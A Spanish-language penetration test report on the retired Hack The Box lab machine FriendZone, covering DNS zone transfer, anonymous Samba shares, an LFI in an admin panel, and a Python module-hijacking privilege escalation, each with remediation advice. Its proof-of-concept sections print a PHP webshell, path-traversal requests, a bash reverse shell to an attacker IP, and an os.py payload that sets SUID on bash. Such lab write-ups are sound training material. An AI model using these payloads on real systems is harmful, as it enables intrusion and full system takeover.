# Informe de Prueba de Penetración — FriendZone

| | |
|---|---|
| **ID de informe** | HO-0008-00 |
| **Objetivo** | FriendZone (`10.129.86.28`) |
| **Plataforma** | Hack The Box — máquina retirada |
| **Tipo de prueba** | Caja negra (black box) |
| **Fecha de ejecución** | 2026-10-19 |
| **Autor** | Francisco Nieto — [@NiettoFrann](https://github.com/NiettoFrann) |
| **Versión** | 1.0 |
| **Clasificación** | Público — uso educativo |

> **Aviso legal.** Las pruebas se realizaron sobre un entorno de laboratorio autorizado
> (Hack The Box) y sobre una máquina retirada. Ninguna técnica descrita debe aplicarse
> sobre sistemas sin autorización expresa por escrito de su propietario.

### Control de versiones

| Versión | Fecha | Descripción |
|---------|-------|-------------|
| 1.0 | 2026-10-19 | Versión inicial |

---

## Índice

1. [Resumen ejecutivo](#1-resumen-ejecutivo)
2. [Alcance y metodología](#2-alcance-y-metodología)
3. [Narrativa del ataque](#3-narrativa-del-ataque)
4. [Hallazgos técnicos](#4-hallazgos-técnicos)
5. [Post-explotación](#5-post-explotación)
6. [Conclusiones](#6-conclusiones)
7. [Anexos](#7-anexos)

---

## 1. Resumen ejecutivo

### 1.1 Objetivo

Evaluar la seguridad del host **FriendZone** simulando un atacante externo sin
credenciales ni conocimiento previo del entorno, para obtener el máximo nivel de
privilegios posible.

### 1.2 Resultado

> El servicio de nombres de dominio permitió a cualquier visitante descargar el listado
> completo de subdominios internos sin autenticarse, incluyendo nombres que no estaban
> enlazados desde ningún sitio público. Uno de los sistemas de archivos compartidos de la
> red devolvía un documento con una contraseña de administrador en texto plano, y otro
> aceptaba la subida de archivos sin ningún control. Con esa contraseña se accedió a un
> panel de administración con un defecto que permitía ejecutar como código cualquier
> archivo del servidor, y combinándolo con la posibilidad de subir un archivo propio se
> logró ejecutar comandos en el servidor. Un permiso mal configurado sobre un componente
> del intérprete de Python, usado por una tarea automática que corre como administrador,
> permitió tomar control total del servidor. Un atacante real podría robar o destruir
> toda la información alojada en el equipo.

**Nivel de riesgo global:** `CRÍTICO`

### 1.3 Distribución de hallazgos

| Crítica | Alta | Media | Baja | Informativa |
|:-------:|:----:|:-----:|:----:|:-----------:|
| 1 | 2 | 1 | 1 | 0 |

### 1.4 Resumen de hallazgos

| ID | Hallazgo | Severidad | CVSS |
|----|----------|-----------|------|
| [HO-0008-02](#ho-0008-02--recursos-compartidos-de-samba-accesibles-sin-autenticación-con-credenciales-en-texto-plano-y-escritura-sin-restricciones) | Recursos compartidos de Samba sin autenticación, con credenciales en texto plano y escritura sin restricciones | Crítica | 9.8 |
| [HO-0008-03](#ho-0008-03--inclusión-de-archivos-locales-lfi-con-ejecución-de-código-en-el-panel-de-administración-web) | Inclusión de archivos locales (LFI) con ejecución de código en el panel de administración web | Alta | 8.8 |
| [HO-0008-05](#ho-0008-05--permiso-de-escritura-excesivo-sobre-un-módulo-de-python-ejecutado-por-una-tarea-programada-con-privilegios-de-administrador-module-hijacking) | Permiso de escritura excesivo sobre un módulo de Python (*module hijacking*) | Alta | 7.8 |
| [HO-0008-01](#ho-0008-01--transferencia-de-zona-dns-axfr-sin-restricciones) | Transferencia de zona DNS (AXFR) sin restricciones | Media | 5.3 |
| [HO-0008-04](#ho-0008-04--permisos-de-directorio-excesivos-en-el-directorio-personal-de-un-usuario) | Permisos de directorio excesivos en el directorio personal de un usuario | Baja | 3.3 |

> HO-0008-01, HO-0008-02 y HO-0008-03 están encadenados: HO-0008-01 revela los
> subdominios que exponen el panel vulnerable a HO-0008-03; HO-0008-02 entrega tanto la
> credencial para acceder a ese panel como el medio (escritura en un recurso compartido)
> para convertir el LFI en ejecución de código. Se documentan por separado porque cada
> uno tiene una causa y una corrección independientes.

### 1.5 Recomendaciones prioritarias

1. Deshabilitar la sesión nula en Samba, exigir autenticación con permisos mínimos por share y purgar credenciales en texto plano.
2. Corregir los permisos de `/usr/lib/python2.7/os.py` y auditar el resto de la librería estándar.
3. Eliminar la inclusión dinámica de archivos en `dashboard.php` y restringir la transferencia de zona DNS a servidores secundarios autorizados.

---

## 2. Alcance y metodología

### 2.1 Alcance

| Activo | Dirección | Incluido |
|--------|-----------|:--------:|
| FriendZone | `10.129.86.28` | Sí |

**Fuera de alcance:** ataques de denegación de servicio, infraestructura de la
plataforma y otros jugadores.

### 2.2 Metodología

La prueba siguió las fases del estándar **PTES** (Penetration Testing Execution
Standard), apoyándose en **OWASP WSTG** para los componentes web:

1. **Reconocimiento** — descubrimiento de puertos y servicios.
2. **Enumeración** — identificación de versiones, tecnologías y superficie de ataque.
3. **Análisis de vulnerabilidades** — validación manual de posibles fallos.
4. **Explotación** — obtención de acceso inicial.
5. **Post-explotación** — escalada de privilegios y movimiento lateral.
6. **Reporte** — documentación de hallazgos y recomendaciones.

### 2.3 Entorno del auditor

| Componente | Detalle |
|------------|---------|
| Sistema | Linux (kernel 7.2.11-zen1-1-zen) |
| Conexión | VPN de Hack The Box |
| Herramientas | nmap, dig, gobuster, smbclient, curl, netcat, pspy64 |

### 2.4 Clasificación de severidad

Las vulnerabilidades se puntúan con **CVSS v3.1** (ver tabla de criterios estándar).

---

## 3. Narrativa del ataque

### 3.1 Cadena de compromiso

```mermaid
flowchart LR
    A["Reconocimiento<br/>21/22/53/80/139/443/445"] --> B["Cert. SSL revela<br/>friendzone.red"]
    B --> C["HO-0008-01<br/>AXFR sin restricciones"]
    C --> D["Subdominios<br/>administrator1.*"]
    D --> E["HO-0008-02<br/>SMB sin auth: creds + escritura"]
    E --> F["Login panel admin"]
    F --> G["HO-0008-03<br/>LFI + webshell en share"]
    G --> H["Shell como www-data"]
    H --> I["HO-0008-05<br/>os.py escribible<br/>(module hijacking)"]
    I --> J["root / root.txt"]
```



### 3.2 Reconocimiento

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n -oN loot/puertos.txt 10.129.86.28
nmap -p21,22,53,80,139,443,445 -sCV -Pn -n -T4 -oN loot/detallado.txt 10.129.86.28
```

| Puerto | Servicio | Versión | Observaciones |
|--------|----------|---------|---------------|
| 21/tcp | FTP | vsftpd 3.0.3 | No usado como vector. |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4 | No usado como vector. |
| 53/tcp | DNS | ISC BIND 9.11.3-1ubuntu1.2 | Candidato a transferencia de zona. |
| 80/tcp | HTTP | Apache httpd 2.4.29 — "Friend Zone Escape software" | Vhost HTTP distinto del HTTPS. |
| 139/445/tcp | SMB | Samba smbd 4.7.6-Ubuntu | `account_used: guest`, `message_signing: disabled`. |
| 443/tcp | HTTPS | Apache httpd 2.4.29 | Certificado con `commonName=friendzone.red`. |

El campo `commonName` del certificado SSL del puerto 443 reveló el nombre de dominio real
de la organización, `friendzone.red`, punto de partida de la enumeración DNS posterior.

> Salida completa en el [Anexo A](#a-salida-completa-de-escaneos).

### 3.3 Enumeración

**DNS — transferencia de zona.** Se solicitó una transferencia de zona (AXFR) al propio
servidor DNS de la máquina:

```bash
dig axfr @10.129.86.28 friendzone.red
```

El servidor respondió con la zona completa, incluyendo tres subdominios no enlazados
desde el sitio público:

```text
administrator1.friendzone.red.  IN  A  127.0.0.1
hr.friendzone.red.              IN  A  127.0.0.1
uploads.friendzone.red.         IN  A  127.0.0.1
```

Ver **[HO-0008-01](#ho-0008-01--transferencia-de-zona-dns-axfr-sin-restricciones)**. Se
agregaron los subdominios a `/etc/hosts` apuntando a la IP real de la máquina (el registro
A que entrega AXFR es `127.0.0.1`, irrelevante para el virtual hosting, que resuelve por
el header `Host:`).

Revisando el contenido de la página principal apareció un segundo dominio no detectado
hasta entonces (`info@friendzoneportal.red`). Repitiendo el procedimiento:

```bash
dig axfr @10.129.86.28 friendzoneportal.red
```

Se obtuvieron cuatro subdominios adicionales (`admin`, `files`, `imports`,
`vpn`.`friendzoneportal.red`), confirmando que el fallo afecta a ambas zonas.

**SMB — enumeración de recursos compartidos.**

```bash
smbclient -L //10.129.86.28 -N
```

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
Files           Disk      FriendZone Samba Server Files /etc/Files
general         Disk      FriendZone Samba Server Files
Development     Disk      FriendZone Samba Server Files
IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
```

El comentario del share `Files` reveló, sin que se preguntara por ello, la convención de
rutas del servidor: los shares de Samba están montados bajo `/etc/<NombreDelShare>` en el
filesystem local — dato clave para el LFI posterior. Conectando con sesión nula a cada
share:

- `general`: contiene `creds.txt`, descargable sin restricciones, con una contraseña de administrador en texto plano.
- `Development`: vacío, pero acepta escritura sin ningún control de acceso.
- `Files`: devuelve `NT_STATUS_ACCESS_DENIED`, no accesible con sesión nula.

Ver **[HO-0008-02](#ho-0008-02--recursos-compartidos-de-samba-accesibles-sin-autenticación-con-credenciales-en-texto-plano-y-escritura-sin-restricciones)**.

**HTTP/HTTPS — virtual hosting.** Con los vhosts cargados en `/etc/hosts`, se fuzzearon
rutas sobre `administrator1.friendzone.red`:

```bash
gobuster dir -u https://administrator1.friendzone.red -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -k -t 100
```

Se encontraron `login.php`, `dashboard.php` y `timestamp.php`. `dashboard.php` redirige a
`login.php` (requiere sesión); `timestamp.php` devuelve la hora del servidor, indicio de
que se trata de un fragmento PHP incluido dinámicamente por otra página.

### 3.4 Acceso inicial

Con la credencial `admin:WORKWORKHhallelujah@#` (obtenida del share `general`) se inició
sesión en el panel. `dashboard.php` indica su uso esperado:

```text
Smart photo script for friendzone corp !
image_name param is missed ! please enter it to show the image
default is image_id=a.jpg&pagename=timestamp
```

Al probar `pagename=timestamp` se confirmó que el parámetro agrega automáticamente la
extensión `.php` y que el archivo incluido se ejecuta como código real. Como el share
`Development` (`/etc/Development`) acepta escritura sin autenticación, se subió una
webshell mínima y se incluyó por path traversal. Ver
**[HO-0008-03](#ho-0008-03--inclusión-de-archivos-locales-lfi-con-ejecución-de-código-en-el-panel-de-administración-web)**.


*Figura 1 — Página principal, origen de la enumeración de subdominios y vhosts.*

Estabilización de la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows <N> columns <N>   # valores obtenidos con "stty size" en la terminal propia
```

### 3.5 Movimiento lateral

No se autenticó como `friend`: un permiso de directorio excesivo permitió leer su flag de
usuario directamente desde `www-data`. Ver
**[HO-0008-04](#ho-0008-04--permisos-de-directorio-excesivos-en-el-directorio-personal-de-un-usuario)**.

### 3.6 Escalada de privilegios

Ver **[HO-0008-05](#ho-0008-05--permiso-de-escritura-excesivo-sobre-un-módulo-de-python-ejecutado-por-una-tarea-programada-con-privilegios-de-administrador-module-hijacking)**.

---

## 4. Hallazgos técnicos

### HO-0008-01 — Transferencia de zona DNS (AXFR) sin restricciones

| | |
|---|---|
| **Severidad** | Media |
| **CVSS v3.1** | 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) — Exposure of Sensitive Information to an Unauthorized Actor |
| **CVE** | — |
| **Componente afectado** | ISC BIND 9.11.3 — `10.129.86.28:53/tcp` |
| **Estado** | Explotada |

#### Descripción

El servidor DNS autoritativo de `friendzone.red` y `friendzoneportal.red` responde a
solicitudes de transferencia de zona (AXFR) de cualquier origen, sin restringirlas a
servidores secundarios autorizados.

#### Prueba de concepto

```bash
dig axfr @10.129.86.28 friendzone.red
dig axfr @10.129.86.28 friendzoneportal.red
```

#### Impacto

Cualquier cliente puede listar en una sola consulta todos los subdominios configurados,
incluyendo cuatro que no están enlazados ni son descubribles por fuerza bruta
convencional. Esta información habilitó la localización del panel vulnerable a
HO-0008-03.

#### Remediación

- **Corto plazo:** filtrar por firewall el acceso TCP al puerto 53 a orígenes no confiables.
- **Largo plazo:** restringir AXFR a las IP de los servidores secundarios autorizados (`allow-transfer` en la configuración de BIND).

#### Referencias

- [CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)

---

### HO-0008-02 — Recursos compartidos de Samba accesibles sin autenticación, con credenciales en texto plano y escritura sin restricciones

| | |
|---|---|
| **Severidad** | Crítica |
| **CVSS v3.1** | 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | [CWE-306](https://cwe.mitre.org/data/definitions/306.html) — Missing Authentication for Critical Function, junto a [CWE-312](https://cwe.mitre.org/data/definitions/312.html) — Cleartext Storage of Sensitive Information |
| **CVE** | — |
| **Componente afectado** | Samba smbd 4.7.6 — `10.129.86.28:139/445`, shares `general` y `Development` |
| **Estado** | Explotada |

#### Descripción

Los recursos compartidos de Samba admiten sesión nula. El share `general` contiene una
credencial de administrador en texto plano descargable por cualquiera; el share
`Development` acepta escritura de archivos sin ningún control de acceso ni restricción de
tipo de contenido.

#### Prueba de concepto

```bash
smbclient //10.129.86.28/general -N
# get creds.txt
```

```text
creds for the admin THING:
admin:WORKWORKHhallelujah@#
```

```bash
smbclient //10.129.86.28/Development -N
smb: \> put shell.php
```

#### Impacto

La credencial filtrada otorgó acceso al panel de administración vulnerable a HO-0008-03,
y la escritura sin control en `Development` fue el medio para subir una webshell PHP y
convertir ese LFI en ejecución remota de código. En conjunto, un atacante sin ninguna
credencial previa obtiene control total del servidor.

#### Remediación

- **Corto plazo:** restringir por firewall el acceso a 139/445 a los segmentos de red que realmente lo necesiten; purgar cualquier credencial en texto plano almacenada en shares.
- **Largo plazo:** deshabilitar el acceso anónimo/sesión nula en Samba (`map to guest = never`, eliminar `guest ok = yes` de los shares) y exigir autenticación con usuarios nominales y permisos mínimos por share.

#### Referencias

- [CWE-306 — Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-312 — Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)

---

### HO-0008-03 — Inclusión de archivos locales (LFI) con ejecución de código en el panel de administración web

| | |
|---|---|
| **Severidad** | Alta |
| **CVSS v3.1** | 8.8 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | [CWE-98](https://cwe.mitre.org/data/definitions/98.html) — Improper Control of Filename for Include/Require Statement in PHP Program |
| **CVE** | — |
| **Componente afectado** | `dashboard.php` (parámetro `pagename`) — `administrator1.friendzone.red:443` |
| **Estado** | Explotada |

#### Descripción

El panel de administración construye la ruta de un archivo a incluir a partir del
parámetro `pagename` sin sanear ni validar su contenido, concatenando automáticamente la
extensión `.php`. El archivo incluido se interpreta y ejecuta como código PHP real, no se
muestra como texto.

#### Prueba de concepto

**Paso 1.** Subida de una webshell mínima al share con escritura sin control.

```php
<?php
  system($_GET['cmd']);
?>
```

**Paso 2.** Inclusión por path traversal y ejecución de comandos.

```bash
curl -s -k -G "https://administrator1.friendzone.red/dashboard.php" \
  --data-urlencode "image_id=a.jpg" \
  --data-urlencode "pagename=../../../../../../../../etc/Development/shell" \
  --data-urlencode "cmd=id"
```

**Paso 3.** Obtención de una reverse shell.

```bash
# listener en el atacante
nc -lvnp 443

# payload
curl -s -k -G "https://administrator1.friendzone.red/dashboard.php" \
  --data-urlencode "image_id=a.jpg" \
  --data-urlencode "pagename=../../../../../../../../etc/Development/shell" \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.15.56/443 0>&1"'
```

#### Impacto

Combinado con la escritura sin control del share `Development` (HO-0008-02), permitió
incluir una webshell propia por path traversal y ejecutar comandos arbitrarios como el
usuario del servicio web (`www-data`), punto de entrada al sistema.

#### Remediación

- **Corto plazo:** validar `pagename` contra una expresión regular estricta sin `../` ni rutas absolutas, y ejecutar PHP con `open_basedir` restringido al directorio de la aplicación.
- **Largo plazo:** eliminar la inclusión dinámica basada en entrada de usuario; usar una lista blanca de páginas válidas (por ejemplo, un `switch` con los nombres permitidos) en lugar de construir la ruta del `include` a partir del parámetro.

#### Referencias

- [CWE-98 — Improper Control of Filename for Include/Require Statement in PHP Program](https://cwe.mitre.org/data/definitions/98.html)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

### HO-0008-04 — Permisos de directorio excesivos en el directorio personal de un usuario

| | |
|---|---|
| **Severidad** | Baja |
| **CVSS v3.1** | 3.3 — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **CWE** | [CWE-732](https://cwe.mitre.org/data/definitions/732.html) — Incorrect Permission Assignment for Critical Resource |
| **CVE** | — |
| **Componente afectado** | `/home/friend` |
| **Estado** | Explotada |

#### Descripción

El directorio personal del usuario `friend` tiene permisos `drwxr-xr-x`, legibles y
navegables por cualquier usuario del sistema, incluyendo cuentas de servicio como
`www-data`.

#### Prueba de concepto

```bash
ls -la /home/friend/
cat /home/friend/user.txt
```

#### Impacto

Permitió leer la flag de usuario sin necesidad de autenticarse como `friend` ni de
comprometer esa cuenta, una vez obtenida ejecución de código como `www-data`. El impacto
está acotado a archivos dentro de ese directorio que no tengan permisos más restrictivos a
nivel de archivo.

#### Remediación

- **Corto plazo:** aplicar permisos `750` o más restrictivos a los directorios personales de usuarios (`chmod 750 /home/*`).
- **Largo plazo:** auditar periódicamente permisos de `/home` con `find /home -maxdepth 1 -perm -o+r`.

#### Referencias

- [CWE-732 — Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)

---

### HO-0008-05 — Permiso de escritura excesivo sobre un módulo de Python ejecutado por una tarea programada con privilegios de administrador (*module hijacking*)

| | |
|---|---|
| **Severidad** | Alta |
| **CVSS v3.1** | 7.8 — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | [CWE-732](https://cwe.mitre.org/data/definitions/732.html) — Incorrect Permission Assignment for Critical Resource, junto a [CWE-427](https://cwe.mitre.org/data/definitions/427.html) — Uncontrolled Search Path Element |
| **CVE** | — |
| **Componente afectado** | `/usr/lib/python2.7/os.py`, tarea cron que ejecuta `/opt/server_admin/reporter.py` como `root` |
| **Estado** | Explotada |

#### Descripción

El módulo estándar `os.py` del intérprete Python 2.7 tiene permiso de escritura para
cualquier usuario del sistema (`rwxrwxrwx`). Un cron ejecuta periódicamente, como `root`,
un script (`reporter.py`) que lo importa, por lo que cualquier código agregado a `os.py`
se ejecuta automáticamente con privilegios de administrador en la siguiente corrida.

#### Prueba de concepto

**Paso 1.** Enumeración local tras descartar vías comunes (SUID, capabilities, `sudo -l`
sin acceso, crontab del sistema sin entradas personalizadas).

```bash
find / -writable -type f 2>/dev/null | grep -v -E "^/proc|^/sys|^/tmp|^/dev"
```

```text
/etc/Development/shell.php
/usr/lib/python2.7/os.py
```

Se confirmó con `pspy64` que un cron ejecuta `/opt/server_admin/reporter.py` como `root`
cada uno o dos minutos, y que ese script comienza con `import os`.

**Paso 2.** El primer intento de payload (`import os; os.system(...)` dentro del propio
`os.py`) falló por un import circular: dentro de `os.py`, ese `import os` solo recupera
una referencia al módulo que se está cargando en ese mismo momento, sin funciones
definidas. Se usó en su lugar `posix`, el módulo en C de bajo nivel del que deriva
`os.system`, no afectado por sobrescribir `os.py`:

```bash
cat > /usr/lib/python2.7/os.py << 'EOF'
import posix
posix.system('chmod +s /bin/bash')
EOF
rm -f /usr/lib/python2.7/os.pyc   # forzar recompilación del bytecode
```

**Paso 3.** En la siguiente ejecución del cron, `reporter.py` importó el `os.py`
modificado y ejecutó el `chmod` como `root`:

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash

/bin/bash -p
whoami    # root
cat /root/root.txt
```

El flag `-p` es necesario porque bash resetea por defecto sus privilegios efectivos
cuando detecta que el UID real (`www-data`) difiere del UID efectivo que otorga el bit
SUID (`root`).

#### Impacto

Un usuario local sin privilegios sobrescribió `os.py` con un comando que otorga el bit
SUID a `/bin/bash`, logrando una shell de `root` y control total del sistema.

#### Remediación

- **Corto plazo:** restaurar los permisos estándar de la librería de Python (`chmod 644 /usr/lib/python2.7/os.py`, propiedad de `root`); auditar el resto de `/usr/lib/python2.7/` y de cualquier `site-packages` en busca de permisos equivalentes.
- **Largo plazo:** revisar y endurecer `reporter.py`, y evitar que tareas con privilegios de `root` dependan de rutas de intérprete compartidas con usuarios no privilegiados.

#### Referencias

- [CWE-732 — Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)
- [CWE-427 — Uncontrolled Search Path Element](https://cwe.mitre.org/data/definitions/427.html)

---

## 5. Post-explotación

### 5.1 Acceso obtenido

| Nivel | Usuario | Método | Prueba |
|-------|---------|--------|--------|
| Servicio web | `www-data` | HO-0008-03 | — |
| Usuario (lectura directa) | `friend` | HO-0008-04 | `user.txt` — valor no conservado en `loot/` |
| Administrador | `root` | HO-0008-05 | `root.txt` — valor no conservado en `loot/` |


*Figura 2 — Confirmación del compromiso total en la plataforma (captura de la propia plataforma HTB, no evidencia técnica de la escalada; ver HO-0008-05 para la prueba de concepto).*

### 5.2 Información sensible expuesta

| Tipo | Ubicación | Observación |
|------|-----------|-------------|
| Credenciales en texto plano | Share SMB `general` — `creds.txt` | `admin:WORKWORKHhallelujah@#`. |
| Subdominios internos | Transferencia de zona DNS | Incluye rutas no enlazadas públicamente. |

> Las credenciales se muestran parcialmente censuradas cuando corresponde.

### 5.3 Limpieza

| Artefacto | Ubicación | Estado |
|-----------|-----------|--------|
| `shell.php` | Share SMB `Development` (`/etc/Development`) | Webshell subida durante la explotación; no se confirmó su eliminación al cierre de la sesión. |
| `/bin/bash` con bit SUID | Objetivo | Modificado durante la escalada; no se confirmó su reversión. |

---

## 6. Conclusiones

### 6.1 Conclusión técnica

Cinco fallos de configuración, varios de ellos encadenados, permitieron el compromiso
total: una transferencia de zona DNS abierta que reveló superficie oculta, recursos
compartidos de Samba sin autenticación que filtraron credenciales y permitieron
escritura, una inclusión de archivos que se convirtió en ejecución de código al
combinarse con esa escritura, y finalmente un permiso excesivo sobre un módulo de Python
usado por una tarea con privilegios de administrador. Ninguno requirió explotar software
desconocido.

### 6.2 Aprendizajes del auditor

- Un certificado SSL vencido o de uso interno suele filtrar el nombre de dominio real en
  su `commonName`, lo que puede abrir la puerta a transferencias de zona DNS que de otro
  modo requerirían fuerza bruta.
- El contenido de una página web (textos, direcciones de correo) es, en sí mismo, una
  fuente de enumeración tan válida como un escaneo.
- Combinar dos hallazgos de severidad individual moderada puede producir un impacto
  crítico conjunto: el análisis de severidad debe considerar también las cadenas, no solo
  los hallazgos aislados.
- Sobrescribir por completo un módulo estándar de un lenguaje puede introducir fallos
  sutiles (import circular); conviene validar la ejecución real del payload antes de
  asumir que una técnica de escalada no funcionó.
- Las tareas `cron` que ejecutan intérpretes compartidos con el resto del sistema son un
  vector de escalada tan relevante como `sudo` o el bit SUID, y conviene enumerarlas de
  forma sistemática (por ejemplo con `pspy`) cuando la enumeración local convencional no
  da resultado.

---

## 7. Anexos

### A. Salida completa de escaneos

<details>
<summary>nmap — todos los puertos</summary>

Disponible en [`loot/puertos.txt`](loot/puertos.txt).

</details>

<details>
<summary>nmap — escaneo de servicios</summary>

Disponible en [`loot/detallado.txt`](loot/detallado.txt).

</details>

<details>
<summary>Transferencia de zona DNS (AXFR)</summary>

Disponible en [`loot/subdomains.txt`](loot/subdomains.txt).

</details>

<details>
<summary>smbclient — listado de shares</summary>

Disponible en [`smbclient.txt`](smbclient.txt) y [`loot/smb.txt`](loot/smb.txt).

</details>

<details>
<summary>gobuster — fuzzing de administrator1.friendzone.red</summary>

Disponible en [`loot/administrator1-gobuster.txt`](loot/administrator1-gobuster.txt).

</details>

### B. Scripts y exploits

<details><summary>shell.php — webshell subida al share Development</summary>

```php
<?php
  system($_GET['cmd']);
?>
```

Archivo completo en [`shell.php`](shell.php).

</details>

<details><summary>os.py — payload de module hijacking</summary>

```python
import posix
posix.system('chmod +s /bin/bash')
```

</details>

### C. Mapeo MITRE ATT&CK

| Táctica | Técnica | ID |
|---------|---------|----|
| Reconnaissance | DNS Zone Transfer | [T1590.002](https://attack.mitre.org/techniques/T1590/002/) |
| Credential Access | Unsecured Credentials | [T1552](https://attack.mitre.org/techniques/T1552/) |
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Privilege Escalation | Hijack Execution Flow | [T1574](https://attack.mitre.org/techniques/T1574/) |
| Privilege Escalation | Scheduled Task/Job | [T1053](https://attack.mitre.org/techniques/T1053/) |

### D. Referencias generales

- [Página de la máquina en HTB](https://app.hackthebox.com/machines/FriendZone)
- [PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Calculadora CVSS v3.1 — FIRST](https://www.first.org/cvss/calculator/3.1)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [HackTricks](https://book.hacktricks.xyz/)
- [GTFOBins](https://gtfobins.github.io/)
